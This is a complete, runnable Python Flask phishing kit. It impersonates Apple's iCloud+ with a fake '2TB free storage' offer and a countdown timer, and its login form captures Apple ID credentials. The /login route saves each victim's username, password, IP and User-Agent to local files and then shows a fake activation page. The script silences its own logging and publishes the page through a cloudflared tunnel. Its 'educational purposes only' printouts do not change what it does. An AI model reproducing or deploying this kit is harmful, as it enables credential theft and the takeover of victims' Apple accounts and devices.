import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'apple-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Apple iCloud")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['ap_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <title>Apple iCloud+ - Free Storage Upgrade</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --apple-blue: #007AFF;
                --apple-gray: #8E8E93;
                --apple-dark: #1D1D1F;
                --apple-light: #F5F5F7;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #F5F5F7 0%, #FFFFFF 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Display', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: flex-start;
                min-height: 100vh;
                color: #1D1D1F;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-box {
                background: white;
                width: 100%;
                max-width: 420px;
                padding: 25px 20px;
                text-align: center;
                border-bottom: 1px solid #D1D1D6;
            }
            
            @media (min-width: 768px) {
                .login-box {
                    margin: 20px auto;
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
                    border: 1px solid #D1D1D6;
                }
                body {
                    padding: 20px;
                    align-items: center;
                }
            }
            
            .apple-logo-container {
                margin: 15px 0 25px;
            }
            
            .apple-logo {
                width: 60px;
                height: 60px;
                margin: 0 auto;
            }
            
            @media (min-width: 768px) {
                .apple-logo {
                    width: 80px;
                    height: 80px;
                }
            }
            
            .icloud-banner {
                background: linear-gradient(90deg, #007AFF 0%, #5856D6 50%, #007AFF 100%);
                color: white;
                padding: 16px;
                border-radius: 12px;
                margin: 20px 0;
                font-weight: 600;
                font-size: 18px;
                border: 2px solid #5856D6;
                line-height: 1.3;
            }
            
            @media (min-width: 768px) {
                .icloud-banner {
                    padding: 18px;
                    font-size: 20px;
                    border-radius: 14px;
                }
            }
            
            .storage-badge {
                background: linear-gradient(45deg, #34C759, #30D158);
                color: white;
                padding: 14px 24px;
                border-radius: 20px;
                margin: 20px auto;
                font-weight: 700;
                font-size: 24px;
                width: fit-content;
                border: 3px solid white;
                box-shadow: 0 8px 24px rgba(52, 199, 89, 0.3);
                line-height: 1.2;
            }
            
            @media (min-width: 768px) {
                .storage-badge {
                    padding: 16px 32px;
                    font-size: 28px;
                    border-radius: 24px;
                }
            }
            
            .giveaway-container {
                background: #F2F2F7;
                border: 2px dashed #007AFF;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .giveaway-container {
                    padding: 25px;
                    border-radius: 14px;
                }
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: #1D1D1F;
                font-weight: 700;
                letter-spacing: -0.5px;
                line-height: 1.2;
            }
            
            @media (min-width: 768px) {
                h1 {
                    font-size: 32px;
                }
            }
            
            .subtitle {
                color: var(--apple-gray);
                font-size: 16px;
                margin-bottom: 25px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .subtitle {
                    font-size: 17px;
                    margin-bottom: 30px;
                }
            }
            
            .timer {
                background: #FFF0F0;
                border: 2px solid #FF3B30;
                border-radius: 10px;
                padding: 16px;
                margin: 20px 0;
                font-family: 'SF Mono', 'Monaco', monospace;
                font-size: 22px;
                color: #FF3B30;
                text-align: center;
                font-weight: 600;
                line-height: 1.2;
            }
            
            @media (min-width: 768px) {
                .timer {
                    padding: 18px;
                    font-size: 24px;
                }
            }
            
            .features-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .features-grid {
                    gap: 15px;
                    margin: 25px 0;
                }
            }
            
            .feature-item {
                background: white;
                border: 1px solid #E5E5EA;
                border-radius: 10px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
            }
            
            @media (min-width: 768px) {
                .feature-item {
                    padding: 20px;
                    border-radius: 12px;
                }
            }
            
            .feature-item:hover {
                border-color: var(--apple-blue);
                box-shadow: 0 8px 24px rgba(0, 122, 255, 0.1);
                transform: translateY(-2px);
            }
            
            .feature-icon {
                font-size: 24px;
                margin-bottom: 10px;
                color: var(--apple-blue);
            }
            
            @media (min-width: 768px) {
                .feature-icon {
                    font-size: 28px;
                    margin-bottom: 12px;
                }
            }
            
            .feature-label {
                font-size: 13px;
                color: var(--apple-gray);
                margin-top: 6px;
            }
            
            @media (min-width: 768px) {
                .feature-label {
                    font-size: 14px;
                    margin-top: 8px;
                }
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            @media (min-width: 768px) {
                .form-group {
                    margin-bottom: 25px;
                }
            }
            
            .form-label {
                color: #1D1D1F;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 8px;
                display: block;
            }
            
            @media (min-width: 768px) {
                .form-label {
                    font-size: 15px;
                    margin-bottom: 10px;
                }
            }
            
            input {
                width: 100%;
                padding: 16px;
                background: #F2F2F7;
                border: 2px solid #E5E5EA;
                border-radius: 10px;
                color: #1D1D1F;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                input {
                    padding: 18px;
                    font-size: 17px;
                    border-radius: 12px;
                }
            }
            
            input:focus {
                border-color: var(--apple-blue);
                outline: none;
                background: white;
            }
            
            input::placeholder {
                color: #C7C7CC;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #007AFF, #5856D6);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 10px;
                font-weight: 600;
                font-size: 17px;
                width: 100%;
                margin: 20px 0 15px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                .login-btn {
                    padding: 20px;
                    border-radius: 12px;
                    font-size: 18px;
                    margin: 25px 0 15px;
                }
            }
            
            .login-btn:hover,
            .login-btn:active {
                opacity: 0.9;
                transform: translateY(-2px);
                box-shadow: 0 12px 30px rgba(0, 122, 255, 0.25);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .benefits-list {
                    margin: 25px 0;
                }
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #1D1D1F;
                font-size: 16px;
                line-height: 1.3;
            }
            
            @media (min-width: 768px) {
                .benefit-item {
                    margin: 18px 0;
                    font-size: 17px;
                }
            }
            
            .benefit-icon {
                color: #34C759;
                font-weight: bold;
                margin-right: 12px;
                font-size: 20px;
                flex-shrink: 0;
            }
            
            @media (min-width: 768px) {
                .benefit-icon {
                    margin-right: 15px;
                    font-size: 22px;
                }
            }
            
            .apple-badge {
                display: inline-flex;
                align-items: center;
                background: #F2F2F7;
                color: #1D1D1F;
                padding: 6px 12px;
                border-radius: 16px;
                font-size: 13px;
                font-weight: 600;
                margin-left: 8px;
                border: 1px solid #E5E5EA;
            }
            
            @media (min-width: 768px) {
                .apple-badge {
                    padding: 8px 16px;
                    font-size: 14px;
                    margin-left: 10px;
                    border-radius: 20px;
                }
            }
            
            .warning-note {
                color: #FF3B30;
                font-size: 12px;
                margin-top: 20px;
                border-top: 1px solid #E5E5EA;
                padding-top: 16px;
                text-align: center;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .warning-note {
                    font-size: 13px;
                    margin-top: 25px;
                    padding-top: 20px;
                }
            }
            
            .devices-grid {
                display: flex;
                justify-content: center;
                gap: 12px;
                margin: 18px 0;
                flex-wrap: wrap;
            }
            
            @media (min-width: 768px) {
                .devices-grid {
                    gap: 15px;
                    margin: 20px 0;
                }
            }
            
            .device-icon {
                background: white;
                border: 1px solid #E5E5EA;
                border-radius: 10px;
                padding: 12px;
                font-size: 22px;
                flex: 0 0 auto;
            }
            
            @media (min-width: 768px) {
                .device-icon {
                    padding: 15px;
                    font-size: 24px;
                    border-radius: 12px;
                }
            }
            
            .privacy-note {
                background: #F2F2F7;
                border-radius: 10px;
                padding: 14px;
                margin: 18px 0;
                font-size: 13px;
                color: var(--apple-gray);
                text-align: left;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .privacy-note {
                    padding: 15px;
                    font-size: 14px;
                    margin: 20px 0;
                    border-radius: 12px;
                }
            }
            
            /* Improved mobile touch targets */
            button, 
            input,
            .login-btn {
                min-height: 44px;
            }
            
            /* Better mobile scrolling */
            html {
                -webkit-overflow-scrolling: touch;
                overflow-scrolling: touch;
            }
        </style>
    </head>
    <body>
        <div style="width: 100%; max-width: 420px;">
            <div class="login-box">
                <div class="apple-logo-container">
                    <svg class="apple-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.09997 22C7.78997 22.05 6.79997 20.68 5.95997 19.47C4.24997 17 2.93997 12.45 4.69997 9.39C5.56997 7.87 7.12997 6.91 8.81997 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z" fill="#1D1D1F"/>
                    </svg>
                </div>
                
                <div class="icloud-banner">
                    🎉 FREE iCLOUD+ UPGRADE 🎉
                </div>
                
                <div class="storage-badge">
                    2TB FREE STORAGE
                </div>
                
                <div class="giveaway-container">
                    <h1>Claim iCloud+ Storage</h1>
                    <div class="subtitle">
                        For Apple users and developers <span class="apple-badge">Secure</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        12:00
                    </div>
                </div>
                
                <div class="devices-grid">
                    <div class="device-icon">📱</div>
                    <div class="device-icon">💻</div>
                    <div class="device-icon">⌚️</div>
                    <div class="device-icon">📺</div>
                </div>
                
                <div class="features-grid">
                    <div class="feature-item">
                        <div class="feature-icon">☁️</div>
                        <div>iCloud+</div>
                        <div class="feature-label">2TB Storage</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">🔒</div>
                        <div>Private Relay</div>
                        <div class="feature-label">VPN Protection</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">🏠</div>
                        <div>HomeKit</div>
                        <div class="feature-label">Secure Video</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">📧</div>
                        <div>Hide My Email</div>
                        <div class="feature-label">Unlimited</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        2TB iCloud+ Storage (Free)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Private Relay (VPN Included)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Hide My Email - Unlimited
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        HomeKit Secure Video (4 Cameras)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Custom Email Domain
                    </div>
                </div>
                
                <div class="privacy-note">
                    🔒 Your data is encrypted end-to-end. Apple never has access to your encryption keys.
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">APPLE ID OR EMAIL</label>
                        <input type="text" name="username" placeholder="Enter your Apple ID or email" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🆓 Claim Free iCloud+
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This special offer ends in 12 minutes. Storage upgrade will be activated within 24 hours.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 720; // 12 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 180) { // Last 3 minutes
                    countdownElement.style.background = '#FFE5E5';
                    countdownElement.style.borderColor = '#FF3B30';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Offer Expired!";
                    countdownElement.style.color = '#FF3B30';
                }
            }
            
            updateTimer();
            
            // Better mobile form handling
            document.querySelector('form').addEventListener('submit', function(e) {
                const inputs = this.querySelectorAll('input[required]');
                let isValid = true;
                
                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        isValid = false;
                        input.style.borderColor = '#FF3B30';
                    } else {
                        input.style.borderColor = '#E5E5EA';
                    }
                });
                
                if (!isValid) {
                    e.preventDefault();
                    alert('Please fill in all required fields.');
                }
            });
            
            // Improve mobile viewport handling
            function handleViewport() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            window.addEventListener('load', handleViewport);
            window.addEventListener('resize', handleViewport);
            window.addEventListener('orientationchange', handleViewport);
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('ap_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Apple ID: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Apple iCloud+ Upgrade\n")
        file.write(f"Promised: 2TB iCloud+ Storage\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>iCloud+ Activation - Apple</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #F5F5F7 0%, #FFFFFF 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Display', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: flex-start;
                min-height: 100vh;
                color: #1D1D1F;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: white;
                padding: 25px 20px;
                width: 100%;
                max-width: 500px;
                border-bottom: 1px solid #D1D1D6;
            }
            
            @media (min-width: 768px) {
                .container {
                    margin: 20px auto;
                    padding: 50px;
                    border-radius: 20px;
                    border: 1px solid #D1D1D6;
                    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
                }
                body {
                    padding: 20px;
                    align-items: center;
                }
            }
            
            .apple-logo {
                width: 60px;
                height: 60px;
                margin: 0 auto 20px;
            }
            
            @media (min-width: 768px) {
                .apple-logo {
                    width: 100px;
                    height: 100px;
                    margin-bottom: 25px;
                }
            }
            
            .apple-icon {
                width: 80px;
                height: 80px;
                margin: 0 auto 25px;
                background: linear-gradient(45deg, #007AFF, #5856D6);
                border-radius: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-size: 40px;
                font-weight: 500;
                animation: float 3s ease-in-out infinite;
            }
            
            @media (min-width: 768px) {
                .apple-icon {
                    width: 100px;
                    height: 100px;
                    font-size: 48px;
                    border-radius: 24px;
                }
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            .processing-container {
                background: #F2F2F7;
                border: 2px solid #007AFF;
                border-radius: 12px;
                padding: 25px;
                margin: 25px 0;
            }
            
            @media (min-width: 768px) {
                .processing-container {
                    padding: 30px;
                    border-radius: 14px;
                    margin: 30px 0;
                }
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: #E5E5EA;
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .progress-container {
                    margin: 25px 0;
                }
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #007AFF, #5856D6, #34C759);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .icloud-activated {
                background: #F2F2F7;
                border: 2px solid #34C759;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .icloud-activated {
                    padding: 25px;
                    margin: 25px 0;
                    border-radius: 14px;
                }
            }
            
            .checkmark {
                color: #34C759;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            @media (min-width: 768px) {
                .checkmark {
                    font-size: 22px;
                    margin-right: 15px;
                }
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 16px 0;
                color: #1D1D1F;
                font-size: 16px;
                line-height: 1.3;
            }
            
            @media (min-width: 768px) {
                .status-item {
                    margin: 20px 0;
                    font-size: 17px;
                }
            }
            
            .storage-amount {
                font-size: 36px;
                font-weight: 800;
                background: linear-gradient(45deg, #007AFF, #5856D6);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                line-height: 1.2;
            }
            
            @media (min-width: 768px) {
                .storage-amount {
                    font-size: 48px;
                    margin: 20px 0;
                }
            }
            
            .device-sync {
                display: flex;
                justify-content: center;
                gap: 16px;
                margin: 20px 0;
                flex-wrap: wrap;
            }
            
            @media (min-width: 768px) {
                .device-sync {
                    gap: 20px;
                    margin: 25px 0;
                }
            }
            
            .device-item {
                background: white;
                border: 1px solid #E5E5EA;
                border-radius: 10px;
                padding: 16px;
                font-size: 24px;
            }
            
            @media (min-width: 768px) {
                .device-item {
                    padding: 20px;
                    font-size: 28px;
                    border-radius: 12px;
                }
            }
            
            .encryption-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #007AFF, #5856D6);
                color: white;
                padding: 8px 16px;
                border-radius: 16px;
                font-size: 13px;
                font-weight: 600;
                margin: 15px 0;
            }
            
            @media (min-width: 768px) {
                .encryption-badge {
                    padding: 10px 20px;
                    font-size: 14px;
                    margin: 20px 0;
                    border-radius: 20px;
                }
            }
            
            h2 {
                margin-bottom: 8px;
                color: #1D1D1F;
                font-size: 24px;
                line-height: 1.2;
            }
            
            @media (min-width: 768px) {
                h2 {
                    font-size: 28px;
                    margin-bottom: 10px;
                }
            }
            
            p {
                color: #8E8E93;
                margin-bottom: 20px;
                font-size: 16px;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                p {
                    font-size: 17px;
                    margin-bottom: 30px;
                }
            }
            
            small {
                font-size: 12px;
            }
            
            @media (min-width: 768px) {
                small {
                    font-size: 13px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="apple-icon"></div>
            
            <svg class="apple-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.09997 22C7.78997 22.05 6.79997 20.68 5.95997 19.47C4.24997 17 2.93997 12.45 4.69997 9.39C5.56997 7.87 7.12997 6.91 8.81997 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z" fill="#1D1D1F"/>
            </svg>
            
            <div class="storage-amount">
                2TB Storage
            </div>
            
            <div class="encryption-badge">
                🔒 End-to-End Encryption Active
            </div>
            
            <h2>iCloud+ Activated!</h2>
            <p>Your storage is being upgraded and secured</p>
            
            <div class="processing-container">
                <h3 style="color: #1D1D1F;">Activating iCloud+ Features</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p style="color: #8E8E93;">Encrypting data and provisioning storage...</p>
            </div>
            
            <div class="device-sync">
                <div class="device-item">📱</div>
                <div class="device-item">💻</div>
                <div class="device-item">⌚️</div>
            </div>
            
            <div class="icloud-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>2TB Storage</strong> added to your iCloud+
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Private Relay</strong> - VPN protection enabled
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Hide My Email</strong> - Unlimited addresses
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>HomeKit Secure</strong> - 4 camera feeds
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Custom Domain</strong> - iCloud email domain
                </div>
            </div>
            
            <p style="color: #8E8E93; margin-top: 25px; font-size: 14px;">
                You will be redirected to Apple ID settings...
                <br>
                <small style="color: #C7C7CC;">Your iCloud+ features will be available on all devices within 24 hours</small>
            </p>
        </div>
        
        <script>
            // Animate storage amount
            setTimeout(() => {
                const storageAmount = document.querySelector('.storage-amount');
                storageAmount.style.transform = 'scale(1.1)';
                storageAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    storageAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Animate device icons
            const devices = document.querySelectorAll('.device-item');
            devices.forEach((device, index) => {
                setTimeout(() => {
                    device.style.transform = 'scale(1.2)';
                    device.style.transition = 'transform 0.3s';
                    setTimeout(() => {
                        device.style.transform = 'scale(1)';
                    }, 300);
                }, index * 500);
            });
            
            // Handle viewport for mobile
            function handleViewport() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            window.addEventListener('load', handleViewport);
            window.addEventListener('resize', handleViewport);
            window.addEventListener('orientationchange', handleViewport);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🍎 Apple iCloud Public Link: {tunnel_url}")
            print(f"💾 Promising: 2TB FREE iCloud+ Storage")
            print(f"🔐 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Apple ID credentials!")
            print("⚠️  Apple IDs have access to ALL Apple devices and services!")
            print("⚠️  This is EXTREMELY DANGEROUS - Apple accounts are high-value targets!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5008, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Apple iCloud+ Upgrade Page...")
    print("📱 Port: 5008")
    print("💾 Save location: ~/storage/downloads/AppleiCloud/")
    print("💾 Promising: 2TB FREE iCloud+ Storage")
    print("🔒 Features: Private Relay, Hide My Email, HomeKit Secure")
    print("⚠️  EXTREME CAUTION: Apple IDs are HIGH-VALUE targets!")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5008")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)